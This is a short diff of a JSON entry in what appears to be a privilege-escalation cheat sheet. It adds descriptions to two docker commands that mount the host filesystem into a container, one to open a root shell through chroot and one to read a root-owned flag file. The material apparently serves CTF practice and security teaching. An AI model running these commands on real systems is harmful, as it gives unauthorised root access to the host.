@@ -196,11 +196,13 @@
   "variations": [
     {
       "label": "Mount host root + chroot",
-      "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+      "command": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+      "description": "Exploits Docker group membership to mount the host filesystem into a container. If your user is in the docker group, this gives effective root access to the entire host filesystem."
     },
     {
       "label": "Read a root file directly",
-      "command": "docker run -v /:/mnt --rm -it alpine cat /mnt/root/root.txt"
+      "command": "docker run -v /:/mnt --rm -it alpine cat /mnt/root/root.txt",
+      "description": "Exploits Docker group membership to mount the host filesystem into a container. If your user is in the docker group, this gives effective root access to the entire host filesystem."
     }
   ],
   "steps": [
